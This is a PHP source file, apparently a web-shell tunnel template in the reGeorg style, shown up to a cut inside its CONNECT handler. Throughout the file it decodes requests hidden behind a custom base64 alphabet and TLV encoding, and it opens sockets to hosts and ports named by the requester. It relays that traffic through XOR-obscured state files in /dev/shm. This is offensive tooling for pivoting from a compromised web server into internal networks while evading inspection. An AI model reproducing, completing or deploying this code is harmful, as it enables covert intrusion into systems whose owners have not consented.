<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set('always_populate_raw_post_data', -1);
ini_set("output_buffering", "Off");
ini_set("zlib.output_compression", "Off");
ini_set("implicit_flush", "On");
error_reporting(E_ERROR | E_PARSE);
@set_time_limit(0);
@ignore_user_abort(true);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);

function blv_decode($data) {
    $data_len = strlen($data);
    $info = array();
    $i = 0;
    while ( $i < $data_len) {
        $d = unpack("c1b/N1l", substr($data, $i, 5));
        $b = $d['b'];
        $l = $d['l'] - BLV_L_OFFSET;
        $i += 5;
        $v = substr($data, $i, $l);
        $i += $l;
        $info[$b] = $v;
    }
    if (isset($info[1]) && isset($info[11])) {
        $info[1] = gzuncompress($info[1]);
    }
    return $info;
}

function blv_encode($info, $compressionMode = "optimal", $optimalLimit = 1024) {
    $data = "";
    $info[0] = randstr();
    $info[39] = randstr();
    if (isset($info[11])) {
        unset($info[11]);
    }

    foreach($info as $b => $v) {
        if ($b == 1 && roger_should_compress($compressionMode, $v, $optimalLimit)) {
            $v = gzcompress($v, compression_level($compressionMode, strlen($v)));
            $info[11] = "1";
        }
        $l = strlen($v) + BLV_L_OFFSET;
        $data .= pack("c1N1", $b, $l);
        $data .= $v;
    }
    if (isset($info[11])) {
        $v = $info[11];
        $l = strlen($v) + BLV_L_OFFSET;
        $data .= pack("c1N1", 11, $l);
        $data .= $v;
    }
    return $data;
}

function blv_encode_compact($info, $compressionMode = "optimal", $optimalLimit = 1024) {
    $data = "";
    $dataCompressed = false;

    foreach($info as $b => $v) {
        if ($b == 11) {
            continue;
        }
        if ($b == 1 && strlen($v) == 0) {
            continue;
        }
        if ($b == 1 && roger_should_compress($compressionMode, $v, $optimalLimit)) {
            $v = gzcompress($v, compression_level($compressionMode, strlen($v)));
            $dataCompressed = true;
        }
        $l = strlen($v) + BLV_L_OFFSET;
        $data .= pack("c1N1", $b, $l);
        $data .= $v;
    }

    if ($dataCompressed) {
        $v = "1";
        $l = strlen($v) + BLV_L_OFFSET;
        $data .= pack("c1N1", 11, $l);
        $data .= $v;
    }
    return $data;
}

function roger_stream_frame($info, $compressionMode, $optimalLimit, $en, $de) {
    $payload = rtrim(strtr(base64_encode(blv_encode_compact($info, $compressionMode, $optimalLimit)), $en, $de), "=");
    return sprintf("%08x", strlen($payload)) . $payload;
}

function roger_stream_headers() {
    @set_time_limit(0);
    @ignore_user_abort(true);
    while (ob_get_level() > 0) {
        @ob_end_flush();
    }
    header("Content-Type: application/octet-stream");
    header("Cache-Control: no-cache, no-store");
    header("Pragma: no-cache");
}

function roger_stream_write($info, $compressionMode, $optimalLimit, $en, $de) {
    echo roger_stream_frame($info, $compressionMode, $optimalLimit, $en, $de);
    @ob_flush();
    flush();
}

function compression_level($mode, $data_len) {
    if ($mode == "optimal" || $mode == "smart") return 1;
    if ($data_len <= 8192) return 1;
    if ($data_len <= 65536) return 3;
    return 6;
}

function roger_byte_entropy($data) {
    $len = strlen($data);
    if ($len == 0) {
        return 0.0;
    }
    $counts = array_fill(0, 256, 0);
    for ($i = 0; $i < $len; $i++) {
        $counts[ord($data[$i])] += 1;
    }
    $entropy = 0.0;
    foreach ($counts as $count) {
        if ($count == 0) {
            continue;
        }
        $probability = $count / $len;
        $entropy -= $probability * (log($probability) / log(2));
    }
    return $entropy;
}

function roger_should_compress($mode, $data, $optimalLimit) {
    if ($mode == "smart") {
        if (strlen($data) <= 1024) {
            return false;
        }
        return roger_byte_entropy($data) < 7.5;
    }
    if (strlen($data) <= $optimalLimit) {
        return false;
    }
    return $mode == "optimal" || $mode == "dynamic";
}

function randstr() {
    $rand = '';
    $length = mt_rand(5, 20);
    for ($i = 0; $i < $length; $i++) {
        $rand .= chr(mt_rand(0, 255));
    }
    return $rand;
}

function roger_write_all($socket, $data) {
    $written = 0;
    $length = strlen($data);
    $emptyWrites = 0;
    while ($written < $length) {
        $n = fwrite($socket, substr($data, $written));
        if ($n === false) {
            return false;
        }
        if ($n === 0) {
            $emptyWrites += 1;
            if ($emptyWrites > 300) {
                return false;
            }
            usleep(10000);
            continue;
        }
        $emptyWrites = 0;
        $written += $n;
    }
    return true;
}

function roger_drain_pending_tcp_before_shutdown($socket, $path, $lockfile) {
    $quietPolls = 0;
    for ($i = 0; $i < 10; $i++) {
        usleep(50000);
        $stateLock = roger_lock_acquire($lockfile);
        $writeBuff = roger_file_take_unlocked($path);
        roger_lock_release($stateLock);
        if ($writeBuff == "") {
            $quietPolls++;
            if ($quietPolls >= 2) {
                break;
            }
            continue;
        }
        $quietPolls = 0;
        if (roger_write_all($socket, $writeBuff) === false) {
            return false;
        }
    }
    return true;
}

function roger_state_dir() {
    if (is_dir("/dev/shm") && is_writable("/dev/shm")) {
        return "/dev/shm";
    }
    return sys_get_temp_dir();
}

function roger_state_file($mark, $name) {
    return roger_state_dir() . "/session_" . sha1($mark . "_" . $name);
}

function roger_lock_acquire($path) {
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return false;
    }
    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        return false;
    }
    return $fp;
}

function roger_lock_release($fp) {
    if ($fp !== false) {
        flock($fp, LOCK_UN);
        fclose($fp);
    }
}

function roger_file_xor($path, $data, $offset = 0) {
    if ($data === "") {
        return "";
    }
    $key = sha1("roger-state|" . $path, true);
    $blockSize = 20;
    $counter = intval(floor($offset / $blockSize));
    $skip = $offset % $blockSize;
    $stream = "";
    while (strlen($stream) < strlen($data) + $skip) {
        $stream .= sha1($key . pack("N", $counter), true);
        $counter++;
    }
    return $data ^ substr($stream, $skip, strlen($data));
}

function roger_file_append($path, $data) {
    if ($data === "") {
        return;
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return;
    }
    if (flock($fp, LOCK_EX)) {
        fseek($fp, 0, SEEK_END);
        $offset = ftell($fp);
        fwrite($fp, roger_file_xor($path, $data, $offset));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
}

function roger_file_append_unlocked($path, $data) {
    if ($data === "") {
        return;
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return;
    }
    fseek($fp, 0, SEEK_END);
    $offset = ftell($fp);
    fwrite($fp, roger_file_xor($path, $data, $offset));
    fflush($fp);
    fclose($fp);
}

function roger_file_take($path) {
    if (!file_exists($path)) {
        return "";
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return "";
    }
    $data = "";
    if (flock($fp, LOCK_EX)) {
        $stored = stream_get_contents($fp);
        if ($stored !== false) {
            $data = roger_file_xor($path, $stored, 0);
        }
        ftruncate($fp, 0);
        rewind($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $data;
}

function roger_file_take_unlocked($path) {
    if (!file_exists($path)) {
        return "";
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return "";
    }
    $stored = stream_get_contents($fp);
    $data = $stored !== false ? roger_file_xor($path, $stored, 0) : "";
    ftruncate($fp, 0);
    rewind($fp);
    fclose($fp);
    return $data;
}

function roger_file_take_limit($path, $limit) {
    if (!file_exists($path)) {
        return "";
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return "";
    }
    $taken = "";
    if (flock($fp, LOCK_EX)) {
        $stored = stream_get_contents($fp);
        $data = $stored !== false ? roger_file_xor($path, $stored, 0) : "";
        $taken = substr($data, 0, $limit);
        $rest = substr($data, strlen($taken));
        ftruncate($fp, 0);
        rewind($fp);
        if ($rest !== "") {
            fwrite($fp, roger_file_xor($path, $rest, 0));
        }
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $taken;
}

function roger_file_take_limit_unlocked($path, $limit) {
    if (!file_exists($path)) {
        return "";
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return "";
    }
    $stored = stream_get_contents($fp);
    $data = $stored !== false ? roger_file_xor($path, $stored, 0) : "";
    $taken = substr($data, 0, $limit);
    $rest = substr($data, strlen($taken));
    ftruncate($fp, 0);
    rewind($fp);
    if ($rest !== "") {
        fwrite($fp, roger_file_xor($path, $rest, 0));
    }
    fflush($fp);
    fclose($fp);
    return $taken;
}

function roger_file_clear($path) {
    if (file_exists($path)) {
        @unlink($path);
    }
}

function roger_file_put($path, $data) {
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return;
    }
    if (flock($fp, LOCK_EX)) {
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, roger_file_xor($path, $data, 0));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
}

function roger_file_put_unlocked($path, $data) {
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return;
    }
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, roger_file_xor($path, $data, 0));
    fflush($fp);
    fclose($fp);
}

function roger_file_get($path, $default = "") {
    if (!file_exists($path)) {
        return $default;
    }
    $fp = fopen($path, "rb");
    if ($fp === false) {
        return $default;
    }
    $data = $default;
    if (flock($fp, LOCK_SH)) {
        $read = stream_get_contents($fp);
        if ($read !== false) {
            $data = roger_file_xor($path, $read, 0);
        }
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $data;
}

function roger_file_get_unlocked($path, $default = "") {
    if (!file_exists($path)) {
        return $default;
    }
    $fp = fopen($path, "rb");
    if ($fp === false) {
        return $default;
    }
    $read = stream_get_contents($fp);
    fclose($fp);
    return $read !== false ? roger_file_xor($path, $read, 0) : $default;
}

function roger_file_bool($path, $default = false) {
    return roger_file_get($path, $default ? "1" : "0") === "1";
}

function roger_file_bool_unlocked($path, $default = false) {
    return roger_file_get_unlocked($path, $default ? "1" : "0") === "1";
}

function roger_file_put_bool($path, $value) {
    roger_file_put($path, $value ? "1" : "0");
}

function roger_file_put_bool_unlocked($path, $value) {
    roger_file_put_unlocked($path, $value ? "1" : "0");
}

function roger_file_take_bool($path) {
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return false;
    }
    $value = false;
    if (flock($fp, LOCK_EX)) {
        $stored = stream_get_contents($fp);
        $data = $stored !== false ? roger_file_xor($path, $stored, 0) : "";
        $value = $data === "1";
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, roger_file_xor($path, "0", 0));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $value;
}

function roger_file_take_bool_unlocked($path) {
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return false;
    }
    $stored = stream_get_contents($fp);
    $data = $stored !== false ? roger_file_xor($path, $stored, 0) : "";
    $value = $data === "1";
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, roger_file_xor($path, "0", 0));
    fflush($fp);
    fclose($fp);
    return $value;
}

function roger_control_state($path) {
    $stored = roger_file_get($path, "");
    $state = $stored !== "" ? @unserialize($stored) : array();
    if (!is_array($state)) {
        $state = array();
    }
    return array(
        "run" => isset($state["run"]) ? (bool)$state["run"] : false,
        "command" => isset($state["command"]) ? $state["command"] : "",
        "peer" => isset($state["peer"]) ? $state["peer"] : "",
        "remote_eof" => isset($state["remote_eof"]) ? (bool)$state["remote_eof"] : false,
        "remote_eof_sent" => isset($state["remote_eof_sent"]) ? (bool)$state["remote_eof_sent"] : false,
        "halfclose" => isset($state["halfclose"]) ? (bool)$state["halfclose"] : false,
    );
}

function roger_control_state_unlocked($path) {
    $stored = roger_file_get_unlocked($path, "");
    $state = $stored !== "" ? @unserialize($stored) : array();
    if (!is_array($state)) {
        $state = array();
    }
    return array(
        "run" => isset($state["run"]) ? (bool)$state["run"] : false,
        "command" => isset($state["command"]) ? $state["command"] : "",
        "peer" => isset($state["peer"]) ? $state["peer"] : "",
        "remote_eof" => isset($state["remote_eof"]) ? (bool)$state["remote_eof"] : false,
        "remote_eof_sent" => isset($state["remote_eof_sent"]) ? (bool)$state["remote_eof_sent"] : false,
        "halfclose" => isset($state["halfclose"]) ? (bool)$state["halfclose"] : false,
    );
}

function roger_control_save($path, $run, $command, $peer, $remoteEof, $remoteEofSent, $halfClose = false) {
    roger_file_put($path, serialize(array(
        "run" => (bool)$run,
        "command" => $command,
        "peer" => $peer,
        "remote_eof" => (bool)$remoteEof,
        "remote_eof_sent" => (bool)$remoteEofSent,
        "halfclose" => (bool)$halfClose,
    )));
}

function roger_control_save_unlocked($path, $run, $command, $peer, $remoteEof, $remoteEofSent, $halfClose = false) {
    roger_file_put_unlocked($path, serialize(array(
        "run" => (bool)$run,
        "command" => $command,
        "peer" => $peer,
        "remote_eof" => (bool)$remoteEof,
        "remote_eof_sent" => (bool)$remoteEofSent,
        "halfclose" => (bool)$halfClose,
    )));
}

function roger_control_update($path, $updates) {
    $state = roger_control_state($path);
    foreach ($updates as $key => $value) {
        $state[$key] = $value;
    }
    roger_control_save($path, $state["run"], $state["command"], $state["peer"], $state["remote_eof"], $state["remote_eof_sent"], $state["halfclose"]);
}

function roger_control_update_unlocked($path, $updates) {
    $state = roger_control_state_unlocked($path);
    foreach ($updates as $key => $value) {
        $state[$key] = $value;
    }
    roger_control_save_unlocked($path, $state["run"], $state["command"], $state["peer"], $state["remote_eof"], $state["remote_eof_sent"], $state["halfclose"]);
}

function roger_udp_queue_pack($data, $meta, $peer) {
    return pack("nnN", strlen($peer), strlen($meta), strlen($data)) . $peer . $meta . $data;
}

function roger_udp_queue_unpack($record) {
    if (strlen($record) < 8) {
        return null;
    }
    $h = unpack("npeer/nmeta/Ndata", substr($record, 0, 8));
    $offset = 8;
    $peer = substr($record, $offset, $h["peer"]);
    $offset += $h["peer"];
    $meta = substr($record, $offset, $h["meta"]);
    $offset += $h["meta"];
    $data = substr($record, $offset, $h["data"]);
    return array("data" => $data, "meta" => $meta, "peer" => $peer);
}

function roger_udp_queue_append($path, $data, $meta, $peer) {
    $record = roger_udp_queue_pack($data, $meta, $peer);
    roger_file_append($path, $record);
}

function roger_udp_queue_take($path) {
    if (!file_exists($path)) {
        return null;
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return null;
    }
    $packet = null;
    if (flock($fp, LOCK_EX)) {
        $stored = stream_get_contents($fp);
        $data = $stored !== false ? roger_file_xor($path, $stored, 0) : false;
        if ($data !== false && strlen($data) >= 8) {
            $h = unpack("npeer/nmeta/Ndata", substr($data, 0, 8));
            $recordLen = 8 + $h["peer"] + $h["meta"] + $h["data"];
            if (strlen($data) >= $recordLen) {
                $packet = roger_udp_queue_unpack(substr($data, 0, $recordLen));
                $rest = substr($data, $recordLen);
                ftruncate($fp, 0);
                rewind($fp);
                if ($rest !== "") {
                    fwrite($fp, roger_file_xor($path, $rest, 0));
                }
                fflush($fp);
            }
        }
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $packet;
}

function roger_udp_queue_take_unlocked($path) {
    if (!file_exists($path)) {
        return null;
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return null;
    }
    $stored = stream_get_contents($fp);
    $data = $stored !== false ? roger_file_xor($path, $stored, 0) : false;
    $packet = null;
    if ($data !== false && strlen($data) >= 8) {
        $h = unpack("npeer/nmeta/Ndata", substr($data, 0, 8));
        $recordLen = 8 + $h["peer"] + $h["meta"] + $h["data"];
        if (strlen($data) >= $recordLen) {
            $packet = roger_udp_queue_unpack(substr($data, 0, $recordLen));
            $rest = substr($data, $recordLen);
            ftruncate($fp, 0);
            rewind($fp);
            if ($rest !== "") {
                fwrite($fp, roger_file_xor($path, $rest, 0));
            }
            fflush($fp);
        }
    }
    fclose($fp);
    return $packet;
}

function roger_udp_queue_peek($path) {
    if (!file_exists($path)) {
        return null;
    }
    $fp = fopen($path, "rb");
    if ($fp === false) {
        return null;
    }
    $packet = null;
    if (flock($fp, LOCK_SH)) {
        $stored = stream_get_contents($fp);
        $data = $stored !== false ? roger_file_xor($path, $stored, 0) : "";
        $header = substr($data, 0, 8);
        if ($header !== false && strlen($header) == 8) {
            $h = unpack("npeer/nmeta/Ndata", $header);
            $bodyLen = $h["peer"] + $h["meta"] + $h["data"];
            $body = $bodyLen > 0 ? substr($data, 8, $bodyLen) : "";
            if (strlen($body) == $bodyLen) {
                $packet = roger_udp_queue_unpack($header . $body);
            }
        }
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $packet;
}

function roger_udp_queue_peek_unlocked($path) {
    if (!file_exists($path)) {
        return null;
    }
    $data = roger_file_get_unlocked($path, "");
    $packet = null;
    $header = substr($data, 0, 8);
    if ($header !== false && strlen($header) == 8) {
        $h = unpack("npeer/nmeta/Ndata", $header);
        $bodyLen = $h["peer"] + $h["meta"] + $h["data"];
        $body = $bodyLen > 0 ? substr($data, 8, $bodyLen) : "";
        if (strlen($body) == $bodyLen) {
            $packet = roger_udp_queue_unpack($header . $body);
        }
    }
    return $packet;
}

function roger_udp_queue_trim($path, $maxBytes) {
    clearstatcache(true, $path);
    while (file_exists($path) && filesize($path) > $maxBytes) {
        if (roger_udp_queue_take($path) === null) {
            break;
        }
        clearstatcache(true, $path);
    }
}

function roger_udp_queue_trim_unlocked($path, $maxBytes) {
    clearstatcache(true, $path);
    while (file_exists($path) && filesize($path) > $maxBytes) {
        if (roger_udp_queue_take_unlocked($path) === null) {
            break;
        }
        clearstatcache(true, $path);
    }
}

function roger_udp_reassemble_file($path, $data, $meta) {
    if ($meta == "") {
        return array(true, $data);
    }
    $fp = fopen($path, "c+b");
    if ($fp === false) {
        return array(false, "");
    }
    $result = array(false, "");
    if (flock($fp, LOCK_EX)) {
        $encrypted = stream_get_contents($fp);
        $stored = $encrypted !== false ? roger_file_xor($path, $encrypted, 0) : "";
        $buffers = $stored !== "" ? @unserialize($stored) : array();
        if (!is_array($buffers)) {
            $buffers = array();
        }
        $result = roger_udp_reassemble_fragment($buffers, $data, $meta);
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, roger_file_xor($path, serialize($buffers), 0));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
    return $result;
}

function roger_udp_reassemble_file_unlocked($path, $data, $meta) {
    if ($meta == "") {
        return array(true, $data);
    }
    $stored = roger_file_get_unlocked($path, "");
    $buffers = $stored !== "" ? @unserialize($stored) : array();
    if (!is_array($buffers)) {
        $buffers = array();
    }
    $result = roger_udp_reassemble_fragment($buffers, $data, $meta);
    roger_file_put_unlocked($path, serialize($buffers));
    return $result;
}

function roger_split_peer($peer) {
    $pos = strrpos($peer, ":");
    if ($pos === false) {
        return array("", "");
    }
    return array(substr($peer, 0, $pos), substr($peer, $pos + 1));
}

function roger_udp_fragment_payload($data, $udpFragSize) {
    if ($udpFragSize <= 0) {
        return array();
    }
    if (strlen($data) <= $udpFragSize) {
        return array(array("meta" => "", "data" => $data));
    }
    $count = max(1, intval(ceil(strlen($data) / $udpFragSize)));
    $id = mt_rand(0, 0xffffffff);
    $fragments = array();
    for ($i = 0; $i < $count; $i++) {
        $chunk = substr($data, $i * $udpFragSize, $udpFragSize);
        $fragments[] = array("meta" => pack("NnnN", $id, $i, $count, strlen($data)), "data" => $chunk);
    }
    return $fragments;
}

function roger_udp_reassemble_fragment(&$buffers, $data, $meta) {
    if ($meta == "") {
        return array(true, $data);
    }
    if (strlen($meta) != 12) {
        return array(false, "");
    }
    $h = unpack("Nid/nindex/ncount/Ntotal", $meta);
    if ($h["count"] < 1 || $h["index"] >= $h["count"] || $h["total"] > UDPMAXSIZE) {
        return array(false, "");
    }
    $id = strval($h["id"]);
    if (!isset($buffers[$id])) {
        $buffers[$id] = array("count" => $h["count"], "total" => $h["total"], "chunks" => array());
    }
    if ($buffers[$id]["count"] != $h["count"] || $buffers[$id]["total"] != $h["total"]) {
        unset($buffers[$id]);
        return array(false, "");
    }
    $buffers[$id]["chunks"][$h["index"]] = $data;
    if (count($buffers[$id]["chunks"]) != $h["count"]) {
        return array(false, "");
    }
    $data = "";
    for ($i = 0; $i < $h["count"]; $i++) {
        if (!isset($buffers[$id]["chunks"][$i])) {
            return array(false, "");
        }
        $data .= $buffers[$id]["chunks"][$i];
    }
    unset($buffers[$id]);
    if (strlen($data) != $h["total"]) {
        return array(false, "");
    }
    return array(true, $data);
}

$DATA          = 1;
$CMD           = 2;
$MARK          = 3;
$STATUS        = 4;
$ERROR         = 5;
$IP            = 6;
$PORT          = 7;
$REDIRECTURL   = 8;
$FORCEREDIRECT = 9;
$UDPFRAG       = 10;
$DATACOMP      = 11;
$READBUFOPT    = 12;
$MAXREADOPT    = 13;
$UDPFRAGOPT    = 14;
$HALFCLOSEOPT  = 15;
$CLIENTCOMPOPT = 16;
$SERVERCOMPOPT = 17;
$CLIENTLIMITOPT = 18;
$SERVERLIMITOPT = 19;
$UDPTIMEOUTOPT = 20;
$MODEOPT        = 21;
$MODES          = 22;

function roger_bool_setting($value, $default) {
    if ($value === null || $value === "") {
        return $default;
    }
    return $value === "1" || strtolower($value) === "true";
}

function roger_int_setting($value, $default) {
    if ($value === null || $value === "" || !is_numeric($value)) {
        return $default;
    }
    $value = intval($value);
    return $value > 0 ? $value : $default;
}

function roger_compression_setting($value, $default) {
    if ($value === null || $value === "") {
        return $default;
    }
    $value = strtolower($value);
    return ($value === "dynamic" || $value === "optimal" || $value === "smart") ? $value : $default;
}

function roger_mode_setting($value, $default) {
    if ($value === null || $value === "") {
        return $default;
    }
    $value = strtolower($value);
    return ($value === "classic" || $value === "half" || $value === "full") ? $value : $default;
}

function roger_settings_file($settingsKey) {
    return roger_state_file($settingsKey, "settings");
}

function roger_load_settings_values($settingsKey) {
    $stored = roger_file_get(roger_settings_file($settingsKey), "");
    if ($stored !== "") {
        $settings = @unserialize($stored);
        if (is_array($settings)) {
            return $settings;
        }
    }
    return array();
}

function roger_save_settings_values($settingsKey, $settings) {
    roger_file_put(roger_settings_file($settingsKey), serialize($settings));
}

function roger_session_settings($settingsKey) {
    $settings = roger_load_settings_values($settingsKey);
    return array(
        "readbuf" => roger_int_setting(isset($settings["readbuf"]) ? $settings["readbuf"] : null, READBUF),
        "maxread" => roger_int_setting(isset($settings["maxread"]) ? $settings["maxread"] : null, MAXREADSIZE),
        "udpfrag" => roger_int_setting(isset($settings["udpfrag"]) ? $settings["udpfrag"] : null, UDPFRAGSIZE),
        "halfclose" => roger_bool_setting(isset($settings["halfclose"]) ? $settings["halfclose"] : null, HALF_CLOSE_MODE),
        "servercomp" => roger_compression_setting(isset($settings["servercomp"]) ? $settings["servercomp"] : null, "optimal"),
        "serverlimit" => roger_int_setting(isset($settings["serverlimit"]) ? $settings["serverlimit"] : null, 1024),
        "udptimeout" => roger_int_setting(isset($settings["udptimeout"]) ? $settings["udptimeout"] : null, UDP_IDLE_TIMEOUT),
        "mode" => roger_mode_setting(isset($settings["mode"]) ? $settings["mode"] : null, "classic"),
    );
}

function roger_settings_from_info($info) {
    global $READBUFOPT, $MAXREADOPT, $UDPFRAGOPT, $HALFCLOSEOPT, $SERVERCOMPOPT, $SERVERLIMITOPT, $UDPTIMEOUTOPT, $MODEOPT;
    return array(
        "readbuf" => roger_int_setting(isset($info[$READBUFOPT]) ? $info[$READBUFOPT] : null, READBUF),
        "maxread" => roger_int_setting(isset($info[$MAXREADOPT]) ? $info[$MAXREADOPT] : null, MAXREADSIZE),
        "udpfrag" => roger_int_setting(isset($info[$UDPFRAGOPT]) ? $info[$UDPFRAGOPT] : null, UDPFRAGSIZE),
        "halfclose" => roger_bool_setting(isset($info[$HALFCLOSEOPT]) ? $info[$HALFCLOSEOPT] : null, HALF_CLOSE_MODE),
        "servercomp" => roger_compression_setting(isset($info[$SERVERCOMPOPT]) ? $info[$SERVERCOMPOPT] : null, "optimal"),
        "serverlimit" => roger_int_setting(isset($info[$SERVERLIMITOPT]) ? $info[$SERVERLIMITOPT] : null, 1024),
        "udptimeout" => roger_int_setting(isset($info[$UDPTIMEOUTOPT]) ? $info[$UDPTIMEOUTOPT] : null, UDP_IDLE_TIMEOUT),
        "mode" => roger_mode_setting(isset($info[$MODEOPT]) ? $info[$MODEOPT] : null, "classic"),
    );
}

function roger_update_settings_from_info($current, $info) {
    global $READBUFOPT, $MAXREADOPT, $UDPFRAGOPT, $HALFCLOSEOPT, $SERVERCOMPOPT, $SERVERLIMITOPT, $UDPTIMEOUTOPT, $MODEOPT;
    $updated = $current;
    if (isset($info[$READBUFOPT])) {
        $updated["readbuf"] = roger_int_setting($info[$READBUFOPT], $updated["readbuf"]);
    }
    if (isset($info[$MAXREADOPT])) {
        $updated["maxread"] = roger_int_setting($info[$MAXREADOPT], $updated["maxread"]);
    }
    if (isset($info[$UDPFRAGOPT])) {
        $updated["udpfrag"] = roger_int_setting($info[$UDPFRAGOPT], $updated["udpfrag"]);
    }
    if (isset($info[$HALFCLOSEOPT])) {
        $updated["halfclose"] = roger_bool_setting($info[$HALFCLOSEOPT], $updated["halfclose"]);
    }
    if (isset($info[$SERVERCOMPOPT])) {
        $updated["servercomp"] = roger_compression_setting($info[$SERVERCOMPOPT], $updated["servercomp"]);
    }
    if (isset($info[$SERVERLIMITOPT])) {
        $updated["serverlimit"] = roger_int_setting($info[$SERVERLIMITOPT], $updated["serverlimit"]);
    }
    if (isset($info[$UDPTIMEOUTOPT])) {
        $updated["udptimeout"] = roger_int_setting($info[$UDPTIMEOUTOPT], $updated["udptimeout"]);
    }
    if (isset($info[$MODEOPT])) {
        $updated["mode"] = roger_mode_setting($info[$MODEOPT], $updated["mode"]);
    }
    return $updated;
}

$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "BASE64 CHARSLIST";

$post_data = file_get_contents("php://input");
if (USE_REQUEST_TEMPLATE == 1) {
    $post_data = substr($post_data, START_INDEX);
    $post_data = substr($post_data, 0, -END_INDEX);
}
$info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
$rinfo = array();
$sayhello = false;
$streamingResponse = false;
$responseSettings = roger_settings_from_info($info);

$mark = $info[$MARK];
$cmd = $info[$CMD];

$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;
$readfile = roger_state_file($mark, "read");
$eoffile = roger_state_file($mark, "eof");
$runfile = roger_state_file($mark, "run");
$lockfile = roger_state_file($mark, "lock");
$tcpwritefile = roger_state_file($mark, "tcp_write");
$commandfile = roger_state_file($mark, "command");
$peerfile = roger_state_file($mark, "peer");
$shutdownfile = roger_state_file($mark, "shutdown");
$shutdownackfile = roger_state_file($mark, "shutdown_ack");
$remoteeoffile = roger_state_file($mark, "remote_eof");
$remoteeofsentfile = roger_state_file($mark, "remote_eof_sent");
$controlfile = roger_state_file($mark, "control");
$udpwritefile = roger_state_file($mark, "udp_write");
$udppacketfile = roger_state_file($mark, "udp_packets");
$udpinfile = roger_state_file($mark, "udp_in");
$udppeerfile = roger_state_file($mark, "udp_peer");
$udpactivityfile = roger_state_file($mark, "udp_activity");
$packetbuf = "packetbuf".$mark;
$command = "CMD".$mark;
$peer = "peer".$mark;
$shutdown = "shutdown".$mark;
$remoteeof = "remoteeof".$mark;
$remoteeofsent = "remoteeofsent".$mark;
$settings = $mark;

switch($cmd){
    case "CAPS":
        {
            $rinfo[$STATUS] = 'OK';
            $rinfo[$MODES] = 'classic,half';
        }
        break;
    case "PROBE":
        {
            $rinfo[$STATUS] = 'OK';
        }
        break;
    case "SETTINGS":
        {
            $rinfo[$STATUS] = 'OK';
        }
        break;
    case "UPDATE_SETTINGS":
        {
            if (file_exists(roger_settings_file($settings))) {
                $current = roger_load_settings_values($settings);
                $updated = roger_update_settings_from_info($current, $info);
                roger_save_settings_values($settings, $updated);
                $rinfo[$STATUS] = 'OK';
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Session is closed';
            }
        }
        break;
    case "CONNECT":
        {
            $sessionSettings = roger_settings_from_info($info);
            roger_save_settings_values($settings, $sessionSettings);
            $sessionReadbuf = $sessionSettings["readbuf"];
            $sessionMaxread = $sessionSettings["maxread"];
            $sessionHalfClose = $sessionSettings["halfclose"];
            set_time_limit(0);
            $target = $info[$IP];
            $port = (int) $info[$PORT];
            $res = fsockopen($target, $port, $errno, $errstr, 3);
            if ($res === false)
            {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'Failed connecting to target';
                break;
            }

            stream_set_blocking($res, false);
            ignore_user_abort(true);
            $stateLock = roger_lock_acquire($lockfile);
            roger_file_clear($readfile);
            roger_file_clear($eoffile);
            roger_file_clear($tcpwritefile);
            roger_file_put_bool_unlocked($runfile, true);
            roger_file_put_unlocked($commandfile, "CONNECT");
            roger_file_put_unlocked($peerfile, "");
            roger_file_put_bool_unlocked($shutdownfile, false);
            roger_file_put_bool_unlocked($shutdownackfile, false);
            roger_file_put_bool_unlocked($remoteeoffile, false);
            roger_file_put_bool_unlocked($remoteeofsentfile, false);
            roger_control_save_unlocked($controlfile, true, "CONNECT", "", false, false, $sessionHalfClose);
            roger_lock_release($stateLock);

            while (true)
            {
                $stateLock = roger_lock_acquire($lockfile);
                $running = roger_file_bool_unlocked($runfile);
                $shutdownWrite = roger_file_take_bool_unlocked($shutdownfile);
                $remoteEof = roger_file_bool_unlocked($remoteeoffile);
                $writeBuff = roger_file_take_unlocked($tcpwritefile);
                $hasWrite = $writeBuff != "";
                roger_lock_release($stateLock);
                if (!$running) {
                    break;
                }
                if (!$hasWrite) {
                    usleep(50000);
                }

                $readBuff = "";
                if ($writeBuff != "" && roger_write_all($res, $writeBuff) === false) {
                    $stateLock = roger_lock_acquire($lockfile);
                    roger_file_put_bool_unlocked($runfile, false);
                    roger_control_update_unlocked($controlfile, array("run" => false));
                    roger_lock_release($stateLock);
                    return;
                }
                if ($shutdownWrite) {
                    if (roger_drain_pending_tcp_before_shutdown($res, $tcpwritefile, $lockfile) === false) {
                        $stateLock = roger_lock_acquire($lockfile);
